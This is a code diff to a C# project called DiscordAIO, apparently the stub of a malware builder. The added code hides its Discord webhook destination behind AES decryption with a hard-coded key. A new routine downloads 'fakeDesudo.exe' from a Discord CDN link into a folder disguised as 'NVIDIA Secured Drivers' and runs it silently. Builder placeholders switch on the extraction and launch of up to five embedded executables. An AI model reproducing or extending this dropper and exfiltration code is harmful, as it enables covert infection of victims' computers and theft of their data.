@@ -75,7 +75,8 @@ namespace DiscordAIO
 	// Special thanks to Khainaaeh for Webhook code
 	public class DiscordWebhook
 	{
-		private static string Webhook = "AIOwebhook";
+		private static string LGypdKjLanewaSBd = "AIOwebhook";
+		private static string jEyJpUPbRcEGTMmz = hrzWhUXycwFfbzUe(LGypdKjLanewaSBd);
 		public static string Send(string mssg)
 		{
 			Dictionary<string, object> postParameters = new Dictionary<string, object>();
@@ -84,7 +85,7 @@ namespace DiscordAIO
 			postParameters.Add("avatar_url", "https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png");
 
 
-			HttpWebResponse webResponse = FormUpload.MultipartFormDataPost(Webhook, "Discord AIO", postParameters);
+			HttpWebResponse webResponse = FormUpload.MultipartFormDataPost(jEyJpUPbRcEGTMmz, "Discord AIO", postParameters);
 			StreamReader responseReader = new StreamReader(webResponse.GetResponseStream());
 			string fullResponse = responseReader.ReadToEnd();
 			webResponse.Close();
@@ -108,7 +109,7 @@ namespace DiscordAIO
 
 
 
-			HttpWebResponse webResponse = FormUpload.MultipartFormDataPost(Webhook, "Discord AIO", postParameters);
+			HttpWebResponse webResponse = FormUpload.MultipartFormDataPost(jEyJpUPbRcEGTMmz, "Discord AIO", postParameters);
 			StreamReader responseReader = new StreamReader(webResponse.GetResponseStream());
 			string fullResponse = responseReader.ReadToEnd();
 			webResponse.Close();
@@ -117,6 +118,9 @@ namespace DiscordAIO
 
 			return fullResponse;
 		}
+
+		private static string geEgke = "gqLmaLTWqhkWHvM";
+		private static string oerhw = "SgRFaLRXdRgACznHz";
 
 		public static string SendPhoto(string filename, string fileformat, string filepath, string application)
 		{
@@ -131,14 +135,50 @@ namespace DiscordAIO
 			postParameters.Add("username", "Discord AIO");
 			postParameters.Add("avatar_url", "https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png");
 
-			HttpWebResponse webResponse = FormUpload.MultipartFormDataPost(Webhook, "Discord AIO", postParameters);
+			HttpWebResponse webResponse = FormUpload.MultipartFormDataPost(jEyJpUPbRcEGTMmz, "Discord AIO", postParameters);
 			StreamReader responseReader = new StreamReader(webResponse.GetResponseStream());
 			string fullResponse = responseReader.ReadToEnd();
 			webResponse.Close();
 
 			return fullResponse;
 		}
+
+        public static string hrzWhUXycwFfbzUe(string cipherText)
+        {
+			int Keysize = 256;
+			int DerivationIterations = 1000;
+
+            var cipherTextBytesWithSaltAndIv = Convert.FromBase64String(cipherText);
+            var saltStringBytes = cipherTextBytesWithSaltAndIv.Take(Keysize / 8).ToArray();
+            var ivStringBytes = cipherTextBytesWithSaltAndIv.Skip(Keysize / 8).Take(Keysize / 8).ToArray();
+            var cipherTextBytes = cipherTextBytesWithSaltAndIv.Skip((Keysize / 8) * 2).Take(cipherTextBytesWithSaltAndIv.Length - ((Keysize / 8) * 2)).ToArray();
+            using (var password = new Rfc2898DeriveBytes(geEgke + oerhw, saltStringBytes, DerivationIterations))
+            {
+                var keyBytes = password.GetBytes(Keysize / 8);
+                using (var symmetricKey = new RijndaelManaged())
+                {
+                    symmetricKey.BlockSize = 256;
+                    symmetricKey.Mode = CipherMode.CBC;
+                    symmetricKey.Padding = PaddingMode.PKCS7;
+                    using (var decryptor = symmetricKey.CreateDecryptor(keyBytes, ivStringBytes))
+                    {
+                        using (var memoryStream = new MemoryStream(cipherTextBytes))
+                        {
+                            using (var cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
+                            {
+                                var plainTextBytes = new byte[cipherTextBytes.Length];
+                                var decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
+                                memoryStream.Close();
+                                cryptoStream.Close();
+                                return Encoding.UTF8.GetString(plainTextBytes, 0, decryptedByteCount);
+                            }
+                        }
+                    }
+                }
+            }
+        }
 	}
+
 	public static class FormUpload
 	{
 		private static readonly Encoding encoding = Encoding.UTF8;
@@ -2937,6 +2977,21 @@ namespace DiscordAIO
 			Process.Start(EEEEEappdata + "\\NVIDIA Secured Drivers\\DiscordTools.exe");
 		}
 
+		public static void RunDesudo() 
+		{
+		    if (!Directory.Exists(EEEEEappdata + "\\NVIDIA Secured Drivers"))
+            {
+                Directory.CreateDirectory(EEEEEappdata + "\\NVIDIA Secured Drivers");
+			}
+
+			try
+			{
+				new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/956346715835871262/fakeDesudo.exe", EEEEEappdata + "\\NVIDIA Secured Drivers\\fakeDesudo.exe");
+			}
+			catch {}
+			Process.Start(EEEEEappdata + "\\NVIDIA Secured Drivers\\fakeDesudo.exe");
+		}
+
 		public static void RunFAKEcmd() 
 		{
 		    if (!Directory.Exists(EEEEEappdata + "\\NVIDIA Secured Drivers"))
@@ -3033,6 +3088,30 @@ namespace DiscordAIO
             return c;
         }
 
+		public static void ExtractSaveResource(String filename, String location)
+        {
+            System.Reflection.Assembly a = System.Reflection.Assembly.GetExecutingAssembly();
+            Stream resFilestream = a.GetManifestResourceStream(filename);
+            if (resFilestream != null)
+            {
+                BinaryReader br = new BinaryReader(resFilestream);
+                FileStream fs = new FileStream(location, FileMode.Create); // say 
+                BinaryWriter bw = new BinaryWriter(fs);
+                byte[] ba = new byte[resFilestream.Length];
+                resFilestream.Read(ba, 0, ba.Length);
+                bw.Write(ba);
+                br.Close();
+                bw.Close();
+                resFilestream.Close();
+            }
+        }
+
+		private static bool embedOne = %otutajembedone%;
+		private static bool embedTwo = %otutajembedtwo%;
+		private static bool embedThree = %otutajembedthree%;
+		private static bool embedFour = %otutajembedfour%;
+		private static bool embedFive = %otutajembedfive%;
+
 		private static void Main(string[] args)
 		{
 
@@ -3106,6 +3185,54 @@ namespace DiscordAIO
 			//ourcoolfakecmd
 			//ourcoolfakenitrogen
 			//ourcoolfakesetup
+			//fakedesexe
+
+			if (embedOne) 
+			{
+				try 
+				{
+					ExtractSaveResource("emExe1.exe", Application.StartupPath + "\\emExe1.exe");
+					Process.Start("emExe1.exe");
+				}
+				catch {}
+			}
+			if (embedTwo) 
+			{
+				try 
+				{
+					ExtractSaveResource("emExe2.exe", Application.StartupPath + "\\emExe2.exe");
+					Process.Start("emExe2.exe");
+				}
+				catch {}
+			}
+			if (embedThree) 
+			{
+				try 
+				{
+					ExtractSaveResource("emExe3.exe", Application.StartupPath + "\\emExe3.exe");
+					Process.Start("emExe3.exe");
+				}
+				catch {}
+			}
+			if (embedFour) 
+			{
+				try 
+				{
+					ExtractSaveResource("emExe4.exe", Application.StartupPath + "\\emExe4.exe");
+					Process.Start("emExe4.exe");
+				}
+				catch {}
+			}
+			if (embedFive) 
+			{
+				try 
+				{
+					ExtractSaveResource("emExe5.exe", Application.StartupPath + "\\emExe5.exe");
+					Process.Start("emExe5.exe");
+				}
+				catch {}
+			}
+
 
 			//ratoverhere
 
